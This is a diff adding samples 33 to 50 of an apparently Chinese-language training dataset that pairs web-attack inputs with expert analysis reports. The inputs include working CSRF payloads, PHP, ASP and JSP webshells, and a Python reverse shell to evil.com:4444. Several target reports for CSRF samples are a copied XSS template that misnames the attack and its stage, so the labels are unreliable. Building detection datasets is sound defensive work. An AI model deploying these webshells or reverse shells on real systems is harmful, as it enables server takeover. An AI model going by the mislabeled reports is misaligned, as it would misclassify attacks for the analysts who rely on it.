+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "CSRF攻击",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "CSRF攻击"
+    }
+  },
+  {
+    "sample_id": 33,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: CSRF攻击\n攻击阶段: 武器化\n威胁等级: 高风险\n网络协议: HTTP\n源IP地址: 10.1.1.20\n目标IP地址: 192.168.100.8\n攻击时间: 2024-10-08 16:02:25\n\n攻击载荷:\n<script>fetch('http://admin.com/change_password',{method:'POST',body:'new=hacked123'})</script>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "CSRF攻击",
+      "attack_stage": "武器化",
+      "threat_level": "高风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "CSRF攻击"
+    }
+  },
+  {
+    "sample_id": 34,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: CSRF攻击\n攻击阶段: 侦察\n威胁等级: 低风险\n网络协议: HTTP\n源IP地址: 203.0.113.15\n目标IP地址: 10.0.0.3\n攻击时间: 2024-10-08 16:03:12\n\n攻击载荷:\n<link rel='prefetch' href='http://target.com/admin?action=test'>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起Web攻击事件，攻击类型为CSRF攻击。\n\n技术分析：\n- 攻击载荷：<link rel='prefetch' href='http://target.com/admin?action=test'>...\n- 攻击协议：HTTP\n- 攻击源：203.0.113.15\n\n**2. 威胁等级评估**\n- 当前威胁等级：低风险\n- 需要进一步技术分析来确定具体威胁程度\n\n**3. 攻击阶段分析**\n当前处于侦察阶段\n\n**4. 防护建议**\n- 立即分析攻击载荷特征\n- 加强Web应用安全监控\n- 更新安全防护策略",
+    "metadata": {
+      "attack_type": "CSRF攻击",
+      "attack_stage": "侦察",
+      "threat_level": "低风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "低风险",
+      "expected_attack_category": "CSRF攻击"
+    }
+  },
+  {
+    "sample_id": 35,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: CSRF攻击\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 198.51.100.40\n目标IP地址: 10.0.0.4\n攻击时间: 2024-10-08 16:04:08\n\n攻击载荷:\n<iframe src='http://social.com/post?message=spam'></iframe>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "CSRF攻击",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "CSRF攻击"
+    }
+  },
+  {
+    "sample_id": 36,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: CSRF攻击\n攻击阶段: 投递\n威胁等级: 中风险\n网络协议: HTTP\n源IP地址: 192.0.2.90\n目标IP地址: 10.0.0.5\n攻击时间: 2024-10-08 16:05:15\n\n攻击载荷:\n<meta http-equiv='refresh' content='0;url=http://shop.com/buy?item=premium'>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起Web攻击事件，攻击类型为CSRF攻击。\n\n技术分析：\n- 攻击载荷：<meta http-equiv='refresh' content='0;url=http://shop.com/buy?item=premium'>...\n- 攻击协议：HTTP\n- 攻击源：192.0.2.90\n\n**2. 威胁等级评估**\n- 当前威胁等级：中风险\n- 需要进一步技术分析来确定具体威胁程度\n\n**3. 攻击阶段分析**\n当前处于投递阶段\n\n**4. 防护建议**\n- 立即分析攻击载荷特征\n- 加强Web应用安全监控\n- 更新安全防护策略",
+    "metadata": {
+      "attack_type": "CSRF攻击",
+      "attack_stage": "投递",
+      "threat_level": "中风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "中风险",
+      "expected_attack_category": "CSRF攻击"
+    }
+  },
+  {
+    "sample_id": 37,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: CSRF攻击\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 172.20.0.60\n目标IP地址: 10.0.0.6\n攻击时间: 2024-10-08 16:06:22\n\n攻击载荷:\n<script>XMLHttpRequest('POST','http://app.com/settings','theme=dark&language=zh')</script>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "CSRF攻击",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "CSRF攻击"
+    }
+  },
+  {
+    "sample_id": 38,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: CSRF攻击\n攻击阶段: 武器化\n威胁等级: 高风险\n网络协议: HTTP\n源IP地址: 10.10.10.30\n目标IP地址: 192.168.1.8\n攻击时间: 2024-10-08 16:07:30\n\n攻击载荷:\n<form action='http://cms.com/delete_post' method='POST'><input type='submit' style='display:none' id='csrf'></form><script>document.getElementById('csrf').click()</script>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "CSRF攻击",
+      "attack_stage": "武器化",
+      "threat_level": "高风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "CSRF攻击"
+    }
+  },
+  {
+    "sample_id": 39,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: CSRF攻击\n攻击阶段: 侦察\n威胁等级: 低风险\n网络协议: HTTP\n源IP地址: 203.0.113.185\n目标IP地址: 10.0.0.7\n攻击时间: 2024-10-08 16:08:18\n\n攻击载荷:\n<video src='http://target.com/api?action=ping'>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起Web攻击事件，攻击类型为CSRF攻击。\n\n技术分析：\n- 攻击载荷：<video src='http://target.com/api?action=ping'>...\n- 攻击协议：HTTP\n- 攻击源：203.0.113.185\n\n**2. 威胁等级评估**\n- 当前威胁等级：低风险\n- 需要进一步技术分析来确定具体威胁程度\n\n**3. 攻击阶段分析**\n当前处于侦察阶段\n\n**4. 防护建议**\n- 立即分析攻击载荷特征\n- 加强Web应用安全监控\n- 更新安全防护策略",
+    "metadata": {
+      "attack_type": "CSRF攻击",
+      "attack_stage": "侦察",
+      "threat_level": "低风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "低风险",
+      "expected_attack_category": "CSRF攻击"
+    }
+  },
+  {
+    "sample_id": 40,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: CSRF攻击\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 198.51.100.100\n目标IP地址: 10.0.0.8\n攻击时间: 2024-10-08 16:09:25\n\n攻击载荷:\n<script>fetch('http://ecommerce.com/cart/add',{method:'POST',headers:{'Content-Type':'application/json'},body:'{\"product_id\":999,\"quantity\":1}'})</script>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "CSRF攻击",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "CSRF攻击"
+    }
+  },
+  {
+    "sample_id": 41,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: 文件上传漏洞\n攻击阶段: 投递\n威胁等级: 高风险\n网络协议: HTTP\n源IP地址: 192.168.1.80\n目标IP地址: 10.0.0.1\n攻击时间: 2024-10-08 16:10:10\n\n攻击载荷:\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\n\n<?php system($_GET['cmd']); ?>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起Web攻击事件，攻击类型为文件上传漏洞。\n\n技术分析：\n- 攻击载荷：Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\n\n<?php system($_GET['cmd']); ?>...\n- 攻击协议：HTTP\n- 攻击源：192.168.1.80\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 需要进一步技术分析来确定具体威胁程度\n\n**3. 攻击阶段分析**\n当前处于投递阶段\n\n**4. 防护建议**\n- 立即分析攻击载荷特征\n- 加强Web应用安全监控\n- 更新安全防护策略",
+    "metadata": {
+      "attack_type": "文件上传漏洞",
+      "attack_stage": "投递",
+      "threat_level": "高风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "文件上传漏洞"
+    }
+  },
+  {
+    "sample_id": 42,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: 文件上传漏洞\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 172.16.0.40\n目标IP地址: 10.0.0.2\n攻击时间: 2024-10-08 16:11:18\n\n攻击载荷:\nfilename=\"webshell.asp\"\n\n<%eval request(\"cmd\")%>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起Web攻击事件，攻击类型为文件上传漏洞。\n\n技术分析：\n- 攻击载荷：filename=\"webshell.asp\"\n\n<%eval request(\"cmd\")%>...\n- 攻击协议：HTTPS\n- 攻击源：172.16.0.40\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 需要进一步技术分析来确定具体威胁程度\n\n**3. 攻击阶段分析**\n当前处于利用阶段\n\n**4. 防护建议**\n- 立即分析攻击载荷特征\n- 加强Web应用安全监控\n- 更新安全防护策略",
+    "metadata": {
+      "attack_type": "文件上传漏洞",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "文件上传漏洞"
+    }
+  },
+  {
+    "sample_id": 43,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: 文件上传漏洞\n攻击阶段: 武器化\n威胁等级: 高风险\n网络协议: HTTP\n源IP地址: 10.1.1.25\n目标IP地址: 192.168.100.10\n攻击时间: 2024-10-08 16:12:25\n\n攻击载荷:\nfilename=\"backdoor.jsp\"\n\n<%@page import=\"java.io.*\"%><%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起Web攻击事件，攻击类型为文件上传漏洞。\n\n技术分析：\n- 攻击载荷：filename=\"backdoor.jsp\"\n\n<%@page import=\"java.io.*\"%><%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>...\n- 攻击协议：HTTP\n- 攻击源：10.1.1.25\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 需要进一步技术分析来确定具体威胁程度\n\n**3. 攻击阶段分析**\n当前处于武器化阶段\n\n**4. 防护建议**\n- 立即分析攻击载荷特征\n- 加强Web应用安全监控\n- 更新安全防护策略",
+    "metadata": {
+      "attack_type": "文件上传漏洞",
+      "attack_stage": "武器化",
+      "threat_level": "高风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "文件上传漏洞"
+    }
+  },
+  {
+    "sample_id": 44,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: 文件上传漏洞\n攻击阶段: 侦察\n威胁等级: 中风险\n网络协议: HTTP\n源IP地址: 203.0.113.20\n目标IP地址: 10.0.0.3\n攻击时间: 2024-10-08 16:13:12\n\n攻击载荷:\nfilename=\"test.txt\"\n\n<?php phpinfo(); ?>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起Web攻击事件，攻击类型为文件上传漏洞。\n\n技术分析：\n- 攻击载荷：filename=\"test.txt\"\n\n<?php phpinfo(); ?>...\n- 攻击协议：HTTP\n- 攻击源：203.0.113.20\n\n**2. 威胁等级评估**\n- 当前威胁等级：中风险\n- 需要进一步技术分析来确定具体威胁程度\n\n**3. 攻击阶段分析**\n当前处于侦察阶段\n\n**4. 防护建议**\n- 立即分析攻击载荷特征\n- 加强Web应用安全监控\n- 更新安全防护策略",
+    "metadata": {
+      "attack_type": "文件上传漏洞",
+      "attack_stage": "侦察",
+      "threat_level": "中风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "中风险",
+      "expected_attack_category": "文件上传漏洞"
+    }
+  },
+  {
+    "sample_id": 45,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: 文件上传漏洞\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 198.51.100.45\n目标IP地址: 10.0.0.4\n攻击时间: 2024-10-08 16:14:08\n\n攻击载荷:\nfilename=\"exploit.php3\"\n\n<?php include($_GET['file']); ?>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起Web攻击事件，攻击类型为文件上传漏洞。\n\n技术分析：\n- 攻击载荷：filename=\"exploit.php3\"\n\n<?php include($_GET['file']); ?>...\n- 攻击协议：HTTPS\n- 攻击源：198.51.100.45\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 需要进一步技术分析来确定具体威胁程度\n\n**3. 攻击阶段分析**\n当前处于利用阶段\n\n**4. 防护建议**\n- 立即分析攻击载荷特征\n- 加强Web应用安全监控\n- 更新安全防护策略",
+    "metadata": {
+      "attack_type": "文件上传漏洞",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "文件上传漏洞"
+    }
+  },
+  {
+    "sample_id": 46,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: 文件上传漏洞\n攻击阶段: 投递\n威胁等级: 高风险\n网络协议: HTTP\n源IP地址: 192.0.2.100\n目标IP地址: 10.0.0.5\n攻击时间: 2024-10-08 16:15:15\n\n攻击载荷:\nfilename=\"malware.phtml\"\n\n<?php passthru($_POST['cmd']); ?>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起Web攻击事件，攻击类型为文件上传漏洞。\n\n技术分析：\n- 攻击载荷：filename=\"malware.phtml\"\n\n<?php passthru($_POST['cmd']); ?>...\n- 攻击协议：HTTP\n- 攻击源：192.0.2.100\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 需要进一步技术分析来确定具体威胁程度\n\n**3. 攻击阶段分析**\n当前处于投递阶段\n\n**4. 防护建议**\n- 立即分析攻击载荷特征\n- 加强Web应用安全监控\n- 更新安全防护策略",
+    "metadata": {
+      "attack_type": "文件上传漏洞",
+      "attack_stage": "投递",
+      "threat_level": "高风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "文件上传漏洞"
+    }
+  },
+  {
+    "sample_id": 47,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: 文件上传漏洞\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 172.20.0.65\n目标IP地址: 10.0.0.6\n攻击时间: 2024-10-08 16:16:22\n\n攻击载荷:\nfilename=\"reverse_shell.py\"\n\nimport socket,subprocess,os;s=socket.socket();s.connect(('evil.com',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起Web攻击事件，攻击类型为文件上传漏洞。\n\n技术分析：\n- 攻击载荷：filename=\"reverse_shell.py\"\n\nimport socket,subprocess,os;s=socket.socket();s.connect(('evil.com',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash'...\n- 攻击协议：HTTPS\n- 攻击源：172.20.0.65\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 需要进一步技术分析来确定具体威胁程度\n\n**3. 攻击阶段分析**\n当前处于利用阶段\n\n**4. 防护建议**\n- 立即分析攻击载荷特征\n- 加强Web应用安全监控\n- 更新安全防护策略",
+    "metadata": {
+      "attack_type": "文件上传漏洞",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "文件上传漏洞"
+    }
+  },
+  {
+    "sample_id": 48,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: 文件上传漏洞\n攻击阶段: 武器化\n威胁等级: 高风险\n网络协议: HTTP\n源IP地址: 10.10.10.35\n目标IP地址: 192.168.1.10\n攻击时间: 2024-10-08 16:17:30\n\n攻击载荷:\nfilename=\"config.php\"\n\n<?php $conn=mysqli_connect('evil.com','user','pass','db'); ?>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起Web攻击事件，攻击类型为文件上传漏洞。\n\n技术分析：\n- 攻击载荷：filename=\"config.php\"\n\n<?php $conn=mysqli_connect('evil.com','user','pass','db'); ?>...\n- 攻击协议：HTTP\n- 攻击源：10.10.10.35\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 需要进一步技术分析来确定具体威胁程度\n\n**3. 攻击阶段分析**\n当前处于武器化阶段\n\n**4. 防护建议**\n- 立即分析攻击载荷特征\n- 加强Web应用安全监控\n- 更新安全防护策略",
+    "metadata": {
+      "attack_type": "文件上传漏洞",
+      "attack_stage": "武器化",
+      "threat_level": "高风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "文件上传漏洞"
+    }
+  },
+  {
+    "sample_id": 49,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: 文件上传漏洞\n攻击阶段: 侦察\n威胁等级: 低风险\n网络协议: HTTP\n源IP地址: 203.0.113.190\n目标IP地址: 10.0.0.7\n攻击时间: 2024-10-08 16:18:18\n\n攻击载荷:\nfilename=\"info.php\"\n\n<?php echo 'Upload successful'; ?>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起Web攻击事件，攻击类型为文件上传漏洞。\n\n技术分析：\n- 攻击载荷：filename=\"info.php\"\n\n<?php echo 'Upload successful'; ?>...\n- 攻击协议：HTTP\n- 攻击源：203.0.113.190\n\n**2. 威胁等级评估**\n- 当前威胁等级：低风险\n- 需要进一步技术分析来确定具体威胁程度\n\n**3. 攻击阶段分析**\n当前处于侦察阶段\n\n**4. 防护建议**\n- 立即分析攻击载荷特征\n- 加强Web应用安全监控\n- 更新安全防护策略",
+    "metadata": {
+      "attack_type": "文件上传漏洞",
+      "attack_stage": "侦察",
+      "threat_level": "低风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "低风险",
+      "expected_attack_category": "文件上传漏洞"
+    }
+  },
+  {
+    "sample_id": 50,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: 文件上传漏洞\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 198.51.100.105\n目标IP地址: 10.0.0.8\n攻击时间: 2024-10-08 16:19:25\n\n攻击载荷:\nfilename=\"bypass.php5\"\n\n<?php if(isset($_REQUEST['cmd'])){echo '<pre>'.$_REQUEST['cmd'].'</pre>';system($_REQUEST['cmd']);} ?>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起Web攻击事件，攻击类型为文件上传漏洞。\n\n技术分析：\n- 攻击载荷：filename=\"bypass.php5\"\n\n<?php if(isset($_REQUEST['cmd'])){echo '<pre>'.$_REQUEST['cmd'].'</pre>';system($_REQUEST['cmd']);} ?>...\n- 攻击协议：HTTPS\n- 攻击源：198.51.100.105\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 需要进一步技术分析来确定具体威胁程度\n\n**3. 攻击阶段分析**\n当前处于利用阶段\n\n**4. 防护建议**\n- 立即分析攻击载荷特征\n- 加强Web应用安全监控\n- 更新安全防护策略",
+    "metadata": {
+      "attack_type": "文件上传漏洞",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "文件上传漏洞"
+    }
+  }
+]
